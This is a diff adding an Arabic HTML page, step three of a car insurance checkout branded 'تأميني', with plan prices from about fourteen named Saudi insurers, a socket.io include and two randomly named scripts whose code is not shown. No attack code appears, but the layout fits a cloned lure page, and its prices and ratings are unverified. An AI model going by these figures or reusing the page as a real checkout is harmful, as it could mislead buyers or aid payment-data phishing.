@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>تأميني</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/stylec.css">
+
+</head>
+<body>
+<div class="app">
+<header>
+<div class="logo">
+<div class="logo-icon" style="display:flex;align-items:center;justify-content:center;padding:0;overflow:hidden;"><img alt="تأميني" src="images/logo.png" style="width:100%;height:100%;object-fit:cover;display:block;"/></div>
+<span>تأميني</span>
+</div>
+</header>
+<div class="stepper">
+<div class="step" data-step="1">
+<div class="step-number">1</div>
+<span>البيانات الأساسية</span>
+</div>
+<div class="step" data-step="2">
+<div class="step-number">2</div>
+<span>بيانات التأمين</span>
+</div>
+<div class="step active" data-step="3">
+<div class="step-number">3</div>
+<span>قائمة الأسعار</span>
+</div>
+<div class="step" data-step="4">
+<div class="step-number">4</div>
+<span>الإضافات</span>
+</div>
+<div class="step" data-step="5">
+<div class="step-number">5</div>
+<span>الملخص والدفع</span>
+</div>
+</div>
+<main>
+<form id="formStep3">
+<h2>اختر خطة التأمين</h2>
+<div class="plans">
+
+<div class="plan-card highlight-card">
+<div class="best-badge">الأكثر طلباً</div>
+<div class="company-name"><img alt="التعاونية للتأمين" class="company-logo" src="IMG_5257.PNG"/><span>التعاونية للتأمين</span></div>
+<div class="rating-line">تقييم العملاء ⭐⭐⭐⭐⭐ (4.8)</div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">ضد الغير</span>
+<span class="plan-price">٥٤٠ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="التعاونية للتأمين" data-plan="ضد الغير" data-price="540" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">تأمين شامل</span>
+<span class="plan-price">١٨٠٠ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="التعاونية للتأمين" data-plan="تأمين شامل" data-price="1800" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-features">
+<p><strong>ضد الغير:</strong> يغطي أضرار الطرف الثالث فقط حسب وثيقة التأمين.</p>
+<p><strong>تأمين شامل:</strong> يغطي أضرار سيارتك + أضرار الغير + بعض المخاطر الأخرى (سرقة، حريق) حسب الشروط.</p>
+</div>
+<button class="plan-next-btn" type="button">التالي</button>
+</div>
+
+<div class="plan-card">
+<div class="company-name"><img alt="ميدغلف" class="company-logo" src="IMG_5267.PNG"/><span>ميدغلف</span></div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">ضد الغير</span>
+<span class="plan-price">٤٦٨ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="ميدغلف" data-plan="ضد الغير" data-price="468" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">تأمين شامل</span>
+<span class="plan-price">١٦٠٠ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="ميدغلف" data-plan="تأمين شامل" data-price="1600" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-features">
+<p><strong>ضد الغير:</strong> تغطية المسؤولية تجاه الغير فقط.</p>
+<p><strong>تأمين شامل:</strong> تغطية أوسع لحوادث المركبة مع الطرف الثالث.</p>
+</div>
+<button class="plan-next-btn" type="button">التالي</button>
+</div>
+
+<div class="plan-card">
+<div class="company-name"><img alt="شركة ولاء للتأمين" class="company-logo" src="IMG_5268.PNG"/><span>شركة ولاء للتأمين</span></div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">ضد الغير</span>
+<span class="plan-price">٤٩٢ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="شركة ولاء للتأمين" data-plan="ضد الغير" data-price="492" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">تأمين شامل</span>
+<span class="plan-price">١٧٠٠ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="شركة ولاء للتأمين" data-plan="تأمين شامل" data-price="1700" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-features">
+<p><strong>ضد الغير:</strong> أضرار الغير فقط (ممتلكات أو أشخاص).</p>
+<p><strong>تأمين شامل:</strong> تغطية أوسع لحوادث التصادم والأضرار الجزئية.</p>
+</div>
+<button class="plan-next-btn" type="button">التالي</button>
+</div>
+
+<div class="plan-card">
+<div class="company-name"><img alt="سلامة للتأمين" class="company-logo" src="IMG_5271.WEBP"/><span>سلامة للتأمين</span></div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">ضد الغير</span>
+<span class="plan-price">٤٣٢ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="سلامة للتأمين" data-plan="ضد الغير" data-price="432" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">تأمين شامل</span>
+<span class="plan-price">١٥٠٠ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="سلامة للتأمين" data-plan="تأمين شامل" data-price="1500" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-features">
+<p><strong>ضد الغير:</strong> يغطي تعويضات الطرف الثالث.</p>
+<p><strong>تأمين شامل:</strong> يشمل أضرار المركبة المؤمن عليها.</p>
+</div>
+<button class="plan-next-btn" type="button">التالي</button>
+</div>
+
+<div class="plan-card">
+<div class="company-name"><img alt="أسيج للتأمين" class="company-logo" src="IMG_5264.PNG"/><span>أسيج للتأمين</span></div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">ضد الغير</span>
+<span class="plan-price">٤٠٨ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="أسيج للتأمين" data-plan="ضد الغير" data-price="408" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">تأمين شامل</span>
+<span class="plan-price">١٤٥٠ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="أسيج للتأمين" data-plan="تأمين شامل" data-price="1450" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-features">
+<p><strong>ضد الغير:</strong> تغطية أساسية حسب الأنظمة.</p>
+<p><strong>تأمين شامل:</strong> تغطية موسعة داخل حدود الوثيقة.</p>
+</div>
+<button class="plan-next-btn" type="button">التالي</button>
+</div>
+
+<div class="plan-card">
+<div class="company-name"><img alt="الدرع العربي للتأمين" class="company-logo" src="IMG_5265.PNG"/><span>الدرع العربي للتأمين</span></div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">ضد الغير</span>
+<span class="plan-price">٥٠٤ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="الدرع العربي للتأمين" data-plan="ضد الغير" data-price="504" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">تأمين شامل</span>
+<span class="plan-price">١٦٥٠ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="الدرع العربي للتأمين" data-plan="تأمين شامل" data-price="1650" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-features">
+<p><strong>ضد الغير:</strong> يحمي من مطالبات الغير فقط.</p>
+<p><strong>تأمين شامل:</strong> يشمل أضرار المركبة المؤمن عليها.</p>
+</div>
+<button class="plan-next-btn" type="button">التالي</button>
+</div>
+
+<div class="plan-card">
+<div class="company-name"><img alt="ملاذ للتأمين" class="company-logo" src="IMG_5259.PNG"/><span>ملاذ للتأمين</span></div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">ضد الغير</span>
+<span class="plan-price">٥١٦ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="ملاذ للتأمين" data-plan="ضد الغير" data-price="516" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">تأمين شامل</span>
+<span class="plan-price">١٧٠٠ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="ملاذ للتأمين" data-plan="تأمين شامل" data-price="1700" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-features">
+<p><strong>ضد الغير:</strong> التزام قانوني تجاه الغير.</p>
+<p><strong>تأمين شامل:</strong> تغطية أوسع لحوادث وتلفيات المركبة.</p>
+</div>
+<button class="plan-next-btn" type="button">التالي</button>
+</div>
+
+<div class="plan-card">
+<div class="company-name"><img alt="سوليدرتي للتأمين" class="company-logo" src="IMG_5269.PNG"/><span>سوليدرتي للتأمين</span></div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">ضد الغير</span>
+<span class="plan-price">٤٨٠ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="سوليدرتي للتأمين" data-plan="ضد الغير" data-price="480" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">تأمين شامل</span>
+<span class="plan-price">١٦٠٠ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="سوليدرتي للتأمين" data-plan="تأمين شامل" data-price="1600" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-features">
+<p><strong>ضد الغير:</strong> يغطي فقط ما تلزم به تجاه الآخرين.</p>
+<p><strong>تأمين شامل:</strong> يغطي مركبتك والغير ضمن حدود الوثيقة.</p>
+</div>
+<button class="plan-next-btn" type="button">التالي</button>
+</div>
+
+<div class="plan-card">
+<div class="company-name"><img alt="الخليجية للتأمين" class="company-logo" src="IMG_5262.PNG"/><span>الخليجية للتأمين</span></div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">ضد الغير</span>
+<span class="plan-price">٤٥٦ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="الخليجية للتأمين" data-plan="ضد الغير" data-price="456" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">تأمين شامل</span>
+<span class="plan-price">١٥٠٠ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="الخليجية للتأمين" data-plan="تأمين شامل" data-price="1500" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-features">
+<p><strong>ضد الغير:</strong> يغطي أضرار الغير الناتجة عن الحوادث.</p>
+<p><strong>تأمين شامل:</strong> يشمل أضرار مركبتك كذلك حسب البوليصة.</p>
+</div>
+<button class="plan-next-btn" type="button">التالي</button>
+</div>
+
+<div class="plan-card highlight-card">
+<div class="best-badge">الأكثر توفيراً</div>
+<div class="company-name"><img alt="تكافل الراجحي" class="company-logo" src="IMG_5260.PNG"/><span>تكافل الراجحي</span></div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">ضد الغير</span>
+<span class="plan-price">٥٠٤ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="تكافل الراجحي" data-plan="ضد الغير" data-price="504" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">تأمين شامل</span>
+<span class="plan-price">١٧٥٠ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="تكافل الراجحي" data-plan="تأمين شامل" data-price="1750" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-features">
+<p><strong>ضد الغير:</strong> يغطي التزامك النظامي تجاه الغير.</p>
+<p><strong>تأمين شامل:</strong> يغطي أضرار مركبتك مع مزايا إضافية حسب الشروط.</p>
+</div>
+<button class="plan-next-btn" type="button">التالي</button>
+</div>
+
+<div class="plan-card">
+<div class="company-name"><img alt="أكسا للتأمين" class="company-logo" src="IMG_5258.PNG"/><span>أكسا للتأمين</span></div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">ضد الغير</span>
+<span class="plan-price">٤٨٠ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="أكسا للتأمين" data-plan="ضد الغير" data-price="480" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">تأمين شامل</span>
+<span class="plan-price">١٦٥٠ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="أكسا للتأمين" data-plan="تأمين شامل" data-price="1650" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-features">
+<p><strong>ضد الغير:</strong> يغطي الأضرار للطرف الثالث.</p>
+<p><strong>تأمين شامل:</strong> يغطي مركبتك والغير حسب الوثيقة.</p>
+</div>
+<button class="plan-next-btn" type="button">التالي</button>
+</div>
+
+<div class="plan-card highlight-card">
+<div class="best-badge">الأعلى تغطية</div>
+<div class="company-name"><img alt="بوبا للتأمين" class="company-logo" src="IMG_5270.PNG"/><span>بوبا للتأمين</span></div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">ضد الغير</span>
+<span class="plan-price">٤٤٤ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="بوبا للتأمين" data-plan="ضد الغير" data-price="444" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">تأمين شامل</span>
+<span class="plan-price">١٥٥٠ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="بوبا للتأمين" data-plan="تأمين شامل" data-price="1550" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-features">
+<p><strong>ضد الغير:</strong> تغطية أساسية للغير.</p>
+<p><strong>تأمين شامل:</strong> تغطية إضافية للمركبة.</p>
+</div>
+<button class="plan-next-btn" type="button">التالي</button>
+</div>
+
+<div class="plan-card">
+<div class="company-name"><img alt="الإنماء طوكيو مارين" class="company-logo" src="IMG_5263.PNG"/><span>الإنماء طوكيو مارين</span></div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">ضد الغير</span>
+<span class="plan-price">٤٥٦ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="الإنماء طوكيو مارين" data-plan="ضد الغير" data-price="456" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">تأمين شامل</span>
+<span class="plan-price">١٥٨٠ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="الإنماء طوكيو مارين" data-plan="تأمين شامل" data-price="1580" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-features">
+<p><strong>ضد الغير:</strong> يغطي أضرار الغير.</p>
+<p><strong>تأمين شامل:</strong> تغطية موسعة للمركبة.</p>
+</div>
+<button class="plan-next-btn" type="button">التالي</button>
+</div>
+
+<div class="plan-card">
+<div class="company-name"><img alt="الصقر للتأمين" class="company-logo" src="IMG_5261.PNG"/><span>الصقر للتأمين</span></div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">ضد الغير</span>
+<span class="plan-price">٤٣٢ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="الصقر للتأمين" data-plan="ضد الغير" data-price="432" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-row">
+<div class="plan-info">
+<span class="plan-title">تأمين شامل</span>
+<span class="plan-price">١٥٢٠ ريال / سنة</span>
+</div>
+<label>
+<input class="plan-radio" data-company="الصقر للتأمين" data-plan="تأمين شامل" data-price="1520" name="plan" type="radio"/>
+              اختيار
+            </label>
+</div>
+<div class="plan-features">
+<p><strong>ضد الغير:</strong> يغطي المسؤولية تجاه الغير.</p>
+<p><strong>تأمين شامل:</strong> يشمل تغطية مركبتك كذلك.</p>
+</div>
+<button class="plan-next-btn" type="button">التالي</button>
+</div>
+</div>
+<div class="error" id="planError"></div>
+<div class="buttons-row">
+<a class='btn btn-secondary' href='vehicle.html'>السابق</a>
+<button class="btn btn-primary" type="submit">التالي</button>
+</div>
+</form>
+</main>
+</div>
+
+<script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+<script src="js/insurance.js"></script>
+<script src="js/f1j7.js"></script>
+<script src="js/kn5k.js"></script>
+<div class="loading-screen" id="loadingScreen">
+<div class="loading-content">
+<div class="loading-dots">
+<div></div>
+<div></div>
+<div></div>
+<div></div>
+</div>
+<div class="loading-text" id="loadingText">جاري التحميل...</div>
+<div class="loading-subtext" id="loadingSubtext">يرجى الانتظار</div>
+</div>
+</div>
+
+</body>
+</html>
